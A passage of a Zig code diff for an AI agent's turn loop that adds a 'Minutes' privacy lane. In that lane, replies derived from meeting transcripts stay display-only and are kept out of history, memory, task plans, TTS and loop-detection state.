             // break site can escalate to memory recall before giving up.
             var escalate_on_stuck = false;
-            if (self.active_goal_state) |*goal_state| {
-                const goal_reflection_verdict = goal_loop.parseReflection(display_text);
-                goal_state.status = goal_reflection_verdict;
-                goal_state.iteration_count += 1;
+            if (!minutes_foreground_latched) {
+                if (self.active_goal_state) |*goal_state| {
+                    const goal_reflection_verdict = goal_loop.parseReflection(display_text);
+                    goal_state.status = goal_reflection_verdict;
+                    goal_state.iteration_count += 1;
 
-                // Mark exit if goal is met or stuck (will break after tool results processed)
-                if (goal_reflection_verdict == .met or goal_reflection_verdict == .stuck) {
-                    log.info("turn.goal_loop iteration={d} status={s} — will exit after tools", .{
-                        goal_state.iteration_count,
+                    // Mark exit if goal is met or stuck (will break after tool results processed)
+                    if (goal_reflection_verdict == .met or goal_reflection_verdict == .stuck) {
+                        log.info("turn.goal_loop iteration={d} status={s} — will exit after tools", .{
+                            goal_state.iteration_count,
+                            @tagName(goal_reflection_verdict),
+                        });
+                        should_exit_goal_loop = true;
+                    }
+                    // v1.14.18-B G11 (BRAIN_GRAPH ESCALATION): a `stuck` verdict
+                    // is not a clean exit — the agent is frequently just missing
+                    // context that already exists in memory. Flag it so the
+                    // break site escalates to memory_recall/brain_graph once
+                    // before the loop actually exits.
+                    if (goal_reflection_verdict == .stuck) {
+                        escalate_on_stuck = true;
+                    }
+
+                    // v1.14.18-B G5: Capture iteration learning to reflection trail
+                    const learning_summary = try std.fmt.allocPrint(self.allocator, "{d} tool calls processed", .{parsed_calls.len});
+                    defer self.allocator.free(learning_summary);
+                    const first_tool_name = reflectionToolName(parsed_calls, minutes_foreground_latched);
+                    active_reflection_trail.append(
+                        self.allocator,
+                        goal_state.iteration_count - 1, // iteration 0-indexed
+                        first_tool_name,
                         @tagName(goal_reflection_verdict),
-                    });
-                    should_exit_goal_loop = true;
+                        learning_summary,
+                    ) catch |err| {
+                        log.warn("reflection_trail.append failed: {s}", .{@errorName(err)});
+                    };
                 }
-                // v1.14.18-B G11 (BRAIN_GRAPH ESCALATION): a `stuck` verdict
-                // is not a clean exit — the agent is frequently just missing
-                // context that already exists in memory. Flag it so the
-                // break site escalates to memory_recall/brain_graph once
-                // before the loop actually exits.
-                if (goal_reflection_verdict == .stuck) {
-                    escalate_on_stuck = true;
-                }
-
-                // v1.14.18-B G5: Capture iteration learning to reflection trail
-                const learning_summary = try std.fmt.allocPrint(self.allocator, "{d} tool calls processed", .{parsed_calls.len});
-                defer self.allocator.free(learning_summary);
-                const first_tool_name: ?[]const u8 = if (parsed_calls.len > 0) parsed_calls[0].name else null;
-                active_reflection_trail.append(
-                    self.allocator,
-                    goal_state.iteration_count - 1, // iteration 0-indexed
-                    first_tool_name,
-                    @tagName(goal_reflection_verdict),
-                    learning_summary,
-                ) catch |err| {
-                    log.warn("reflection_trail.append failed: {s}", .{@errorName(err)});
-                };
             }
             if (parsed_calls.len > 0) {
                 turn_tool_iterations += 1;
                 turn_tool_calls_total += @intCast(@min(parsed_calls.len, std.math.maxInt(u32)));
-                self.recordSessionToolNames(parsed_calls);
+                // The procedural tool manifest is durable session state. Once
+                // Minutes is latched, provider-authored names are untrusted and
+                // must remain in the foreground transcript only.
+                if (!minutes_foreground_latched) self.recordSessionToolNames(parsed_calls);
             }
 
             if (parsed_calls.len == 0) {
@@ -5200,6 +5977,10 @@ pub const Agent = struct {
                     iteration + 1 < self.max_tool_iterations and
                     (shouldForceActionFollowThrough(display_text) or malformed_tool_markup))
                 {
+                    const intermediate_history = self.intermediateHistoryTarget(
+                        &minutes_foreground_history,
+                        minutes_foreground_latched,
+                    );
                     const follow_up_instruction = if (malformed_tool_markup)
                         "SYSTEM: Your previous response started with <tool_call> markup but no valid tool call was executed. " ++
                             "Emit valid, closed <tool_call>...</tool_call> tags now for each tool action. " ++
@@ -5209,19 +5990,13 @@ pub const Agent = struct {
                             "(for example: \"I'll check now\" or \"Executing web search...\"). " ++
                             "Do it in this turn by issuing the appropriate tool call(s). " ++
                             "If no tool can perform it, respond with a clear limitation now and do not promise or imply that work has started.";
-                    try self.history.append(self.allocator, .{
-                        .role = .assistant,
-                        .content = try self.allocator.dupe(u8, display_text),
-                    });
-                    try self.history.append(self.allocator, .{
-                        .role = .user,
-                        .content = try self.allocator.dupe(u8, follow_up_instruction),
-                    });
+                    try self.appendOwnedTextMessage(intermediate_history, .assistant, display_text);
+                    try self.appendOwnedTextMessage(intermediate_history, .user, follow_up_instruction);
                     if (self.compact_context_enabled) {
                         // v1.14.14 Phase 3 — route through ContextEngine.compact.
                         _ = self.context_engine_state.compact(self);
                     }
-                    self.freeResponseFields(&response);
+                    self.freeResponseFieldsWithPolicy(&response, minutes_foreground_latched);
                     forced_follow_through_count += 1;
                     continue;
                 }
@@ -5240,8 +6015,9 @@ pub const Agent = struct {
                 // The malformed-startup case still routes through the existing
                 // safe-text replacement (a clean error message, not the raw
                 // markup), so we keep that branch untouched.
-                const scrubbed_display_text: []u8 = stripToolCallMarkup(self.allocator, display_text);
-                defer if (scrubbed_display_text.ptr != display_text.ptr) self.allocator.free(scrubbed_display_text);
+                const scrubbed_display_text: []u8 = stripToolCallMarkup(provider_allocator, display_text);
+                defer if (scrubbed_display_text.ptr != display_text.ptr)
+                    freeOwnedBytesWithPolicy(self.allocator, scrubbed_display_text, minutes_foreground_latched);
 
                 // Brain-leak Fix B (rework) — NON-MUTATING scaffold-recurrence
                 // detection on the user-bound text. The original Fix B stripped
@@ -5271,9 +6047,15 @@ pub const Agent = struct {
                     "I hit an internal tool-call formatting error before execution. Please retry."
                 else
                     scrubbed_display_text;
-                const safe_display_internal = transcript.containsInternalReflectionMarker(safe_display_text);
-                const public_display_text = if (!safe_display_internal and transcript.shouldExposeHistoryMessage("assistant", safe_display_text))
-                    safe_display_text
+                const minutes_safe_display_text: ?[]u8 = if (minutes_foreground_latched)
+                    try sanitizeMinutesDisplayText(provider_allocator, safe_display_text)
+                else
+                    null;
+                defer if (minutes_safe_display_text) |value| freeOwnedBytesWithPolicy(self.allocator, value, true);
+                const boundary_display_text = minutes_safe_display_text orelse safe_display_text;
+                const safe_display_internal = transcript.containsInternalReflectionMarker(boundary_display_text);
+                const public_display_text = if (!safe_display_internal and transcript.shouldExposeHistoryMessage("assistant", boundary_display_text))
+                    boundary_display_text
                 else
                     "";
                 const finalize_start_ms = std.time.milliTimestamp();
@@ -5308,15 +6090,27 @@ pub const Agent = struct {
                         "[Context compacted]\n\n";
                     break :blk try std.fmt.allocPrint(self.allocator, "{s}{s}", .{ prefix, public_display_text });
                 } else try self.allocator.dupe(u8, public_display_text);
-                errdefer self.allocator.free(base_text);
+                errdefer freeOwnedBytesWithPolicy(self.allocator, base_text, minutes_foreground_latched);
 
                 const compose_start_ms = std.time.milliTimestamp();
-                const final_reasoning = if (safe_display_internal) null else response.reasoning_content;
-                const composed_final_text = try self.composeFinalReply(base_text, final_reasoning, response.usage);
+                const final_reasoning = if (safe_display_internal or minutes_foreground_latched)
+                    null
+                else
+                    response.reasoning_content;
+                const composed_final_text = if (minutes_foreground_latched)
+                    try commands.composeFinalReplyWithAllocator(
+                        self,
+                        provider_allocator,
+                        base_text,
+                        final_reasoning,
+                        response.usage,
+                    )
+                else
+                    try self.composeFinalReply(base_text, final_reasoning, response.usage);
                 const final_text = if (transcript.shouldExposeHistoryMessage("assistant", composed_final_text))
                     composed_final_text
                 else blk: {
-                    self.allocator.free(composed_final_text);
+                    freeOwnedBytesWithPolicy(self.allocator, composed_final_text, minutes_foreground_latched);
                     break :blk try self.allocator.dupe(u8, "");
                 };
                 const compose_duration_ms: u64 = @intCast(@max(0, std.time.milliTimestamp() - compose_start_ms));
@@ -5328,12 +6122,22 @@ pub const Agent = struct {
                     .run_id = self.current_run_id,
                 } };
                 self.observer.recordEvent(&compose_stage_event);
-                errdefer self.allocator.free(final_text);
+                errdefer freeOwnedBytesWithPolicy(self.allocator, final_text, minutes_foreground_latched);
 
                 var tts_audio_reply_text: ?[]u8 = null;
                 errdefer if (tts_audio_reply_text) |value| self.allocator.free(value);
                 const tts_start_ms = std.time.milliTimestamp();
-                if (try self.prepareTtsPayload(self.allocator, user_message, final_text)) |tts_payload| {
+                // TTS is another external processor and audio synthesis also
+                // creates a local artifact. A reply derived from Minutes PII
+                // stays text-only until processor consent and provenance-aware
+                // retention exist for this lane.
+                if (minutes_foreground_latched) {
+                    const tts_duration_ms: u64 = @intCast(@max(0, std.time.milliTimestamp() - tts_start_ms));
+                    log.info("turn.stage stage=tts_prepare iteration={d} duration_ms={d} chars=0 audio=off reason=minutes_foreground", .{
+                        iteration,
+                        tts_duration_ms,
+                    });
+                } else if (try self.prepareTtsPayload(self.allocator, user_message, final_text)) |tts_payload| {
                     defer self.allocator.free(tts_payload);
                     const tts_duration_ms: u64 = @intCast(@max(0, std.time.milliTimestamp() - tts_start_ms));
                     log.info("turn.stage stage=tts_prepare iteration={d} duration_ms={d} chars={d} provider={s} audio={s}", .{
@@ -5370,10 +6174,14 @@ pub const Agent = struct {
                 // became the visible reply, store that composed reply instead.
                 const history_uses_display = transcript.shouldExposeHistoryMessage("assistant", public_display_text);
                 const history_reply_text = if (history_uses_display) public_display_text else final_text;
-                if (transcript.shouldExposeHistoryMessage("assistant", history_reply_text)) {
+                // Minutes synthesis is display-only. A read grant does not
+                // authorize generic conversation history or later extraction.
+                if (!minutes_foreground_latched and
+                    transcript.shouldExposeHistoryMessage("assistant", history_reply_text))
+                {
                     const hist_content = try self.allocator.dupe(u8, history_reply_text);
                     errdefer self.allocator.free(hist_content);
-                    const hist_reasoning: ?[]const u8 = if (history_uses_display and response.reasoning_content != null)
+                    const hist_reasoning: ?[]const u8 = if (!minutes_foreground_latched and history_uses_display and response.reasoning_content != null)
                         if (response.reasoning_content.?.len > 0) try self.allocator.dupe(u8, response.reasoning_content.?) else null
                     else
                         null;
@@ -5385,7 +6193,7 @@ pub const Agent = struct {
                     });
                 }
 
-                if (!task_plan_created_this_turn) {
+                if (!minutes_foreground_latched and !task_plan_created_this_turn) {
                     if (self.active_task_plan) |*plan| {
                         if (plan.current_step < plan.steps.len) {
                             const step_index = plan.current_step;
@@ -5437,7 +6245,7 @@ pub const Agent = struct {
 
                 // Auto-save the exact final user-visible reply as cold transcript memory.
                 const autosave_start_ms = std.time.milliTimestamp();
-                if (self.auto_save) {
+                if (self.auto_save and !minutes_foreground_latched) {
                     if (self.mem) |mem| {
                         const visible_reply = if (tts_audio_reply_text) |audio_reply| audio_reply else final_text;
                         if (transcript.shouldExposeHistoryMessage("assistant", visible_reply)) {
@@ -5569,8 +6377,8 @@ pub const Agent = struct {
 
                 // Free provider response fields (content, tool_calls, model)
                 // All borrows have been duped into final_text and history at this point.
-                self.freeResponseFields(&response);
-                self.allocator.free(base_text);
+                self.freeResponseFieldsWithPolicy(&response, minutes_foreground_latched);
+                freeOwnedBytesWithPolicy(self.allocator, base_text, minutes_foreground_latched);
 
                 // ── Cache store (only for direct responses, no tool calls) ──
                 const cache_start_ms = std.time.milliTimestamp();
@@ -5654,6 +6462,7 @@ pub const Agent = struct {
                         .tool_only_turn = false,
                         .spawned_task_ids = ids,
                         .iterations_used = turn_tool_iterations,
+                        .reply_data_policy = if (minutes_foreground_latched) .minutes_display_only else .ordinary,
                     };
                 }
                 if (stream_timing_ctx) |*ctx| {
@@ -5669,6 +6478,7 @@ pub const Agent = struct {
                     .tool_only_turn = (final_text.len == 0 and turn_tool_calls_total > 0),
                     .spawned_task_ids = ids,
                     .iterations_used = turn_tool_iterations,
+                    .reply_data_policy = if (minutes_foreground_latched) .minutes_display_only else .ordinary,
                 };
             }
 
@@ -5691,47 +6501,43 @@ pub const Agent = struct {
             // iterations…") provides sufficient context for the
             // wrap-up call to succeed.
             //
-            // Hash this iteration's tool call set. If the same hash
-            // has appeared in every slot of the ring buffer
-            // (LOOP_WINDOW consecutive iterations), we're looping —
-            // free response, break.
-            var h = std.hash.Fnv1a_64.init();
-            for (parsed_calls) |call| {
-                h.update(call.name);
-                h.update("\x00");
-                h.update(call.arguments_json);
-                h.update("\x01");
-            }
-            const call_set_hash = h.final();
-            recent_call_hashes[recent_call_idx % LOOP_WINDOW] = call_set_hash;
-            recent_call_idx += 1;
-            if (recent_call_idx >= LOOP_WINDOW) {
-                var all_same = true;
-                for (recent_call_hashes) |hv| {
-                    if (hv != call_set_hash) {
-                        all_same = false;
+            // Hash this iteration's ordinary tool-call set. Minutes uses its
+            // request-local budget plus the global iteration cap instead: its
+            // transcript-derived arguments never enter diagnostic hash state.
+            if (recordLoopCallSetHash(
+                parsed_calls,
+                minutes_foreground_latched,
+                &recent_call_hashes,
+                &recent_call_idx,
+            )) |call_set_hash| {
+                if (recent_call_idx >= LOOP_DETECTION_WINDOW) {
+                    var all_same = true;
+                    for (recent_call_hashes) |hv| {
+                        if (hv != call_set_hash) {
+                            all_same = false;
+                            break;
+                        }
+                    }
+                    if (all_same) {
+                        loop_detected = true;
+                        log.warn("agent.loop_detected iteration={d} hash={x} — same tool_call set repeated {d}x, EARLY EXIT (D1.10)", .{
+                            iteration,
+                            call_set_hash,
+                            LOOP_DETECTION_WINDOW,
+                        });
+                        self.freeResponseFieldsWithPolicy(&response, minutes_foreground_latched);
+                        // assistant_history_content / parsed_calls / parsed_text
+                        // get freed by the iteration-body defer (the
+                        // free_* flags were set during parsing earlier).
                         break;
                     }
-                }
-                if (all_same) {
-                    loop_detected = true;
-                    log.warn("agent.loop_detected iteration={d} hash={x} — same tool_call set repeated {d}x, EARLY EXIT (D1.10)", .{
-                        iteration,
-                        call_set_hash,
-                        LOOP_WINDOW,
-                    });
-                    self.freeResponseFields(&response);
-                    // assistant_history_content / parsed_calls / parsed_text
-                    // get freed by the iteration-body defer (the
-                    // free_* flags were set during parsing earlier).
-                    break;
                 }
             }
 
             // There are tool calls — print intermediary text.
             // In tests, stdout is used by Zig's test runner protocol (`--listen`),
             // so avoid writing arbitrary text that can corrupt the control channel.
-            if (!builtin.is_test and display_text.len > 0 and parsed_calls.len > 0 and !is_streaming) {
+            if (!builtin.is_test and !minutes_foreground_latched and display_text.len > 0 and parsed_calls.len > 0 and !is_streaming) {
                 var out_buf: [4096]u8 = undefined;
                 var bw = std.fs.File.stdout().writer(&out_buf);
                 const w = &bw.interface;
@@ -5747,7 +6553,9 @@ pub const Agent = struct {
                 free_assistant_history = false;
                 break :blk assistant_history_content;
             } else try self.allocator.dupe(u8, assistant_history_content);
-            errdefer self.allocator.free(assistant_content);
+            var assistant_content_transferred = false;
+            errdefer if (!assistant_content_transferred)
+                freeOwnedBytesWithPolicy(self.allocator, assistant_content, minutes_foreground_latched);
 
             // Carry the model's native reasoning_content so Moonshot's
             // `thinking.keep:"all"` can replay it on the next turn.
@@ -5755,14 +6563,24 @@ pub const Agent = struct {
                 if (rc.len > 0) try self.allocator.dupe(u8, rc) else null
             else
                 null;
-            errdefer if (assistant_reasoning) |r| self.allocator.free(r);
+            var assistant_reasoning_transferred = false;
+            errdefer if (!assistant_reasoning_transferred) {
+                if (assistant_reasoning) |r|
+                    freeOwnedBytesWithPolicy(self.allocator, r, minutes_foreground_latched);
+            };
 
-            try self.history.append(self.allocator, .{
+            const intermediate_history = self.intermediateHistoryTarget(
+                &minutes_foreground_history,
+                minutes_foreground_latched,
+            );
+            try intermediate_history.append(self.allocator, .{
                 .role = .assistant,
                 .content = assistant_content,
                 .reasoning = assistant_reasoning,
                 .tool_calls = if (native_transcript_active) assistant_native_tool_calls else &.{},
             });
+            assistant_content_transferred = true;
+            assistant_reasoning_transferred = true;
             if (native_transcript_active and assistant_native_tool_calls.len > 0) {
                 assistant_native_tool_calls_transferred = true;
                 self.last_turn_context.native_transcript_rendered = true;
@@ -5774,20 +6592,22 @@ pub const Agent = struct {
             var results_buf: std.ArrayListUnmanaged(ToolExecutionResult) = .empty;
             defer results_buf.deinit(self.allocator);
             try results_buf.ensureTotalCapacity(self.allocator, parsed_calls.len);
-            if (self.active_task_plan) |*plan| {
-                for (parsed_calls, 0..) |call, call_idx| {
-                    const plan_index = plan.current_step + @as(u32, @intCast(call_idx));
-                    try plan.markStepRunningWithTool(self.allocator, plan_index, call.name);
-                    task_planner.emitStepProgress(self.observer, plan, plan_index, call.name);
+            if (!minutes_foreground_latched) {
+                if (self.active_task_plan) |*plan| {
+                    for (parsed_calls, 0..) |call, call_idx| {
+                        const plan_index = plan.current_step + @as(u32, @intCast(call_idx));
+                        try plan.markStepRunningWithTool(self.allocator, plan_index, call.name);
+                        task_planner.emitStepProgress(self.observer, plan, plan_index, call.name);
+                    }
+                    self.persistActiveTaskPlan();
                 }
-                self.persistActiveTaskPlan();
             }
             const dispatch_start_ms = std.time.milliTimestamp();
-            const used_parallel_dispatch = self.shouldParallelDispatch(parsed_calls);
+            const used_parallel_dispatch = !minutes_foreground_latched and self.shouldParallelDispatch(parsed_calls);
             if (used_parallel_dispatch) {
                 try self.executeToolCallsParallel(arena, iteration, parsed_calls, &results_buf);
             } else {
-                try self.executeToolCallsSerial(arena, iteration, parsed_calls, &results_buf);
+                try self.executeToolCallsSerial(arena, iteration, parsed_calls, &results_buf, minutes_foreground_latched);
             }
             const dispatch_duration_ms: u64 = @intCast(@max(0, std.time.milliTimestamp() - dispatch_start_ms));
             log.info("turn.stage stage=dispatch_tools iteration={d} duration_ms={d} mode={s} calls={d}", .{
@@ -5797,24 +6617,29 @@ pub const Agent = struct {
                 parsed_calls.len,
             });
 
-            if (self.active_task_plan) |*plan| {
-                for (results_buf.items) |result| {
-                    if (plan.current_step >= plan.steps.len) break;
-                    const step_index = plan.current_step;
-                    if (result.success) {
-                        try plan.markStepDoneWithResult(self.allocator, step_index, result.name, "completed");
-                    } else {
-                        const failure_summary = if (result.output.len > 0) result.output else "tool failed";
-                        try plan.markStepFailedWithError(self.allocator, step_index, result.name, failure_summary);
+            if (!minutes_foreground_latched) {
+                if (self.active_task_plan) |*plan| {
+                    for (results_buf.items) |result| {
+                        if (plan.current_step >= plan.steps.len) break;
+                        const step_index = plan.current_step;
+                        if (result.success) {
+                            try plan.markStepDoneWithResult(self.allocator, step_index, result.name, "completed");
+                        } else {
+                            // Plan state is durable. Even a malformed/partial
+                            // Minutes failure body must not become a persisted task
+                            // error summary outside the foreground lane.
+                            const failure_summary = taskPlanFailureSummary(result, minutes_foreground_latched);
+                            try plan.markStepFailedWithError(self.allocator, step_index, result.name, failure_summary);
+                        }
+                        task_planner.emitStepDone(self.observer, plan, step_index, result.success);
+                        plan.advanceStep();
+                        self.persistActiveTaskPlan();
                     }
-                    task_planner.emitStepDone(self.observer, plan, step_index, result.success);
-                    plan.advanceStep();
-                    self.persistActiveTaskPlan();
-                }
-                if (!task_plan_complete_emitted and plan.isComplete()) {
-                    task_planner.emitPlanComplete(self.observer, plan);
-                    task_plan_complete_emitted = true;
-                    self.persistActiveTaskPlan();
+                    if (!task_plan_complete_emitted and plan.isComplete()) {
+                        task_planner.emitPlanComplete(self.observer, plan);
+                        task_plan_complete_emitted = true;
+                        self.persistActiveTaskPlan();
+                    }
                 }
             }
 
@@ -5849,7 +6674,12 @@ pub const Agent = struct {
             }
 
             if (self.pending_tool_approval) |pending| {
-                try self.appendPendingApprovalToolHistory(arena, results_buf.items, native_transcript_active);
+                try self.appendPendingApprovalToolHistory(
+                    arena,
+                    results_buf.items,
+                    native_transcript_active,
+                    intermediate_history,
+                );
                 const approval_text = try std.fmt.allocPrint(
                     self.allocator,
                     "Approval required for tool {s} (id={d}, risk={s}, reason={s}). Use /approve {d} allow-once|deny",
@@ -5868,7 +6698,7 @@ pub const Agent = struct {
                     .content = try self.allocator.dupe(u8, approval_text),
                 });
 
-                self.freeResponseFields(&response);
+                self.freeResponseFieldsWithPolicy(&response, minutes_foreground_latched);
                 // **D1.7 finding 2 fix (2026-04-26):** mark transferred AFTER
                 // toOwnedSlice succeeds. See the longer comment at the audio_reply
                 // path. Pre-fix would leak duped task_id strings on OOM.
@@ -5878,6 +6708,7 @@ pub const Agent = struct {
                     .text = approval_text,
                     .spawned_task_ids = ids,
                     .iterations_used = turn_tool_iterations,
+                    .reply_data_policy = if (minutes_foreground_latched) .minutes_display_only else .ordinary,
                 };
             }
 
@@ -5885,11 +6716,8 @@ pub const Agent = struct {
             const reflect_start_ms = std.time.milliTimestamp();
             const reflection_prompt = getReflectionPrompt(self.execution_mode);
             if (native_transcript_active) {
-                try self.appendNativeToolResultHistory(arena, results_buf.items);
-                try self.history.append(self.allocator, .{
-                    .role = .user,
-                    .content = try self.allocator.dupe(u8, reflection_prompt),
-                });
+                try self.appendNativeToolResultHistory(arena, results_buf.items, intermediate_history);
+                try self.appendOwnedTextMessage(intermediate_history, .user, reflection_prompt);
             } else {
                 const formatted_results = try dispatcher.formatToolResults(arena, results_buf.items);
                 const scrubbed_results = try providers.scrubToolOutput(arena, formatted_results);
@@ -5898,10 +6726,7 @@ pub const Agent = struct {
                     "{s}\n\n{s}",
                     .{ scrubbed_results, reflection_prompt },
                 );
-                try self.history.append(self.allocator, .{
-                    .role = .user,
-                    .content = try self.allocator.dupe(u8, with_reflection),
-                });
+                try self.appendOwnedTextMessage(intermediate_history, .user, with_reflection);
                 self.last_turn_context.xml_history_messages += 1;
                 self.last_turn_context.bounded_result_count += @intCast(@min(results_buf.items.len, std.math.maxInt(u32)));
             }
@@ -5921,18 +6746,19 @@ pub const Agent = struct {
                 }
 
                 const goal_reflection_prompt = try goal_loop.buildReflectionPrompt(
-                    self.allocator,
+                    provider_allocator,
                     self.active_goal_state.?.goal_text,
                     @intCast(iteration + 1),
                     last_tool_name,
                     last_result_summary,
                 );
-                defer self.allocator.free(goal_reflection_prompt);
+                defer freeOwnedBytesWithPolicy(
+                    self.allocator,
+                    goal_reflection_prompt,
+                    minutes_foreground_latched,
+                );
 
-                try self.history.append(self.allocator, .{
-                    .role = .system,
-                    .content = try self.allocator.dupe(u8, goal_reflection_prompt),
-                });
+                try self.appendOwnedTextMessage(intermediate_history, .system, goal_reflection_prompt);
             }
 
             const reflect_duration_ms: u64 = @intCast(@max(0, std.time.milliTimestamp() - reflect_start_ms));
@@ -5972,7 +6798,9 @@ pub const Agent = struct {
             // produced no native reasoning. Either/or, native preferred
             // (per Nova). This is also the §14.7 honesty fix for G3: the
             // agent's `<recent_thoughts>` is now genuinely its own reasoning.
-            const native_cot: ?[]const u8 = if (response.reasoning_content) |rc|
+            const native_cot: ?[]const u8 = if (minutes_foreground_latched)
+                null
+            else if (response.reasoning_content) |rc|
                 (if (rc.len > 0) rc else null)
             else
                 null;
@@ -5983,7 +6811,7 @@ pub const Agent = struct {
                 } };
                 self.observer.recordEvent(&thinking_event);
                 log.info("turn.stage stage=narration_native_cot iteration={d} len={d}", .{ iteration, cot.len });
-            } else if (self.sidecar_provider != null and self.narration_interval > 0 and
+            } else if (!minutes_foreground_latched and self.sidecar_provider != null and self.narration_interval > 0 and
                 turn_tool_iterations >= 1 and results_buf.items.len > 0)
             {
                 // Fallback: the model emitted no native reasoning this turn.
@@ -6046,13 +6874,14 @@ pub const Agent = struct {
                     "also call `brain_graph`. Use what recall returns to make " ++
                     "progress. If recall genuinely surfaces nothing useful, then " ++
                     "state your conclusion plainly.";
-                try self.history.append(self.allocator, .{
-                    .role = .user,
-                    .content = try self.allocator.dupe(u8, recall_directive),
-                });
+                const stuck_history = self.intermediateHistoryTarget(
+                    &minutes_foreground_history,
+                    minutes_foreground_latched,
+                );
+                try self.appendOwnedTextMessage(stuck_history, .user, recall_directive);
                 log.info("turn.goal_loop stuck-escalation iteration={d} — injected recall directive", .{iteration});
                 stuck_escalation_count += 1;
-                self.freeResponseFields(&response);
+                self.freeResponseFieldsWithPolicy(&response, minutes_foreground_latched);
                 continue;
             }
 
@@ -6063,7 +6892,7 @@ pub const Agent = struct {
             }
 
             // Free provider response fields now that all borrows are consumed.
-            self.freeResponseFields(&response);
+            self.freeResponseFieldsWithPolicy(&response, minutes_foreground_latched);
         }
 
         // ── Graceful degradation: tool iterations exhausted OR loop detected ──
@@ -6084,13 +6913,20 @@ pub const Agent = struct {
             log.warn("Tool iterations exhausted ({d}/{d}), requesting summary", .{ self.max_tool_iterations, self.max_tool_iterations });
         }
 
-        // Append a pseudo-user message forcing a text-only summary
-        try self.history.append(self.allocator, .{
-            .role = .user,
-            .content = try self.allocator.dupe(u8, "SYSTEM: You have reached the maximum number of tool iterations. " ++
+        // Append a pseudo-user message forcing a text-only summary. When a
+        // Minutes read happened, the prompt and all raw tool context stay in the
+        // foreground lane. Its resulting public summary is display-only too.
+        const exhaustion_history = self.intermediateHistoryTarget(
+            &minutes_foreground_history,
+            minutes_foreground_latched,
+        );
+        try self.appendOwnedTextMessage(
+            exhaustion_history,
+            .user,
+            "SYSTEM: You have reached the maximum number of tool iterations. " ++
                 "You MUST NOT call any more tools. Summarize what you have accomplished " ++
-                "so far and what remains to be done. Respond in the same language the user used."),
-        });
+                "so far and what remains to be done. Respond in the same language the user used.",
+        );
 
         // Build messages for the summary call.
         //
@@ -6100,7 +6936,9 @@ pub const Agent = struct {
         // and can report accurately which failure mode fired. `{d}/{d}` in
         // the loop-detected prefix shows the iteration the loop tripped at
         // vs the cap, whereas the exhausted prefix uses cap/cap.
-        const summary_messages = self.buildMessageSlice() catch {
+        _ = iter_arena.reset(.retain_capacity);
+        const summary_arena = iter_arena.allocator();
+        const summary_messages = self.buildProviderMessagesWithForeground(summary_arena, minutes_foreground_history.items) catch {
             const fallback = if (loop_detected)
                 try std.fmt.allocPrint(self.allocator, "[Tool loop detected at {d}/{d}] Could not produce a summary. Try /new and repeat your request.", .{ turn_tool_iterations, self.max_tool_iterations })
             else
@@ -6116,10 +6954,9 @@ pub const Agent = struct {
                 .spawned_task_ids = ids,
                 .iterations_used = turn_tool_iterations,
                 .loop_detected = loop_detected,
+                .reply_data_policy = if (minutes_foreground_latched) .minutes_display_only else .ordinary,
             };
         };
-        defer self.allocator.free(summary_messages);
-
         // **D1.12** — honor vision-fallback consistency for the
         // exhausted-iter summary call. P2_agent_turn_loop.md ugly
         // truth #10: this site previously hardcoded `self.model_name`
@@ -6132,18 +6969,18 @@ pub const Agent = struct {
         // turn that had been running on vision-fallback would summarize
         // via the wrong model — likely hallucinating or erroring.
         const summary_model: []const u8 = blk: {
-            if (shouldRouteToVisionFallback(
-                self.model_name,
-                self.vision_fallback_model,
+            if (self.shouldRouteToVisionFallbackForCurrentTurn(
                 hasImageContentParts(summary_messages),
+                minutes_foreground_latched,
             )) {
                 break :blk self.vision_fallback_model;
             }
             break :blk self.model_name;
         };
+        try self.routeVideoForModel(summary_arena, summary_messages, summary_model, iteration);
 
-        var summary_response = self.provider.chat(
-            self.allocator,
+        var summary_response = self.providerSummaryChat(
+            provider_allocator,
             .{
                 .messages = summary_messages,
                 .model = summary_model,
@@ -6152,9 +6989,10 @@ pub const Agent = struct {
                 .tools = null, // force text-only
                 .timeout_secs = self.message_timeout_secs,
                 .reasoning_effort = self.reasoning_effort,
+                .provider_selection_policy = self.providerSelectionPolicyForCurrentTurn(),
             },
             summary_model,
-            self.temperature,
+            minutes_foreground_latched or self.canInvokeMinutesRead(),
         ) catch {
             const fallback = if (loop_detected)
                 try std.fmt.allocPrint(self.allocator, "[Tool loop detected at {d}/{d}] Could not produce a summary. Try /new and repeat your request.", .{ turn_tool_iterations, self.max_tool_iterations })
@@ -6171,13 +7009,20 @@ pub const Agent = struct {
                 .spawned_task_ids = ids,
                 .iterations_used = turn_tool_iterations,
                 .loop_detected = loop_detected,
+                .reply_data_policy = if (minutes_foreground_latched) .minutes_display_only else .ordinary,
             };
         };
-        defer self.freeResponseFields(&summary_response);
+        defer self.freeResponseFieldsWithPolicy(&summary_response, minutes_foreground_latched);
 
         const summary_text = summary_response.contentOrEmpty();
-        const public_summary_text = if (transcript.shouldExposeHistoryMessage("assistant", summary_text))
-            summary_text
+        const minutes_safe_summary_text: ?[]u8 = if (minutes_foreground_latched)
+            try sanitizeMinutesDisplayText(provider_allocator, summary_text)
+        else
+            null;
+        defer if (minutes_safe_summary_text) |value| freeOwnedBytesWithPolicy(self.allocator, value, true);
+        const boundary_summary_text = minutes_safe_summary_text orelse summary_text;
+        const public_summary_text = if (transcript.shouldExposeHistoryMessage("assistant", boundary_summary_text))
+            boundary_summary_text
         else
             "";
         const prefixed = if (loop_detected)
@@ -6186,8 +7031,11 @@ pub const Agent = struct {
             try std.fmt.allocPrint(self.allocator, "[Tool iteration limit: {d}/{d}]\n\n{s}", .{ self.max_tool_iterations, self.max_tool_iterations, public_summary_text });
         errdefer self.allocator.free(prefixed);
 
-        // Store in history (dupe the raw summary, not the prefixed version)
-        if (transcript.shouldExposeHistoryMessage("assistant", public_summary_text)) {
+        // Ordinary exhaustion summaries remain resumable. Minutes-derived
+        // summaries are display-only and never enter generic history.
+        if (!minutes_foreground_latched and
+            transcript.shouldExposeHistoryMessage("assistant", public_summary_text))
+        {
             try self.history.append(self.allocator, .{
                 .role = .assistant,
                 .content = try self.allocator.dupe(u8, public_summary_text),
@@ -6233,6 +7081,7 @@ pub const Agent = struct {
             .spawned_task_ids = ids,
             .iterations_used = turn_tool_iterations,
             .loop_detected = loop_detected,
+            .reply_data_policy = if (minutes_foreground_latched) .minutes_display_only else .ordinary,
         };
     }
 
@@ -6334,6 +7183,24 @@ pub const Agent = struct {
         var outcome = try self.turnOutcome(user_message);
         defer outcome.deinit(self.allocator);
         return try self.allocator.dupe(u8, outcome.text);
+    }
+
+    /// Nested command continuations still use a text-only command API. Record
+    /// the structured outcome's policy before returning its owned text copy so
+    /// the outer slash-command TurnOutcome inherits the strictest lifecycle.
+    pub fn turnForCommandContinuation(self: *Agent, user_message: []const u8) ![]const u8 {
+        var outcome = try self.turnOutcome(user_message);
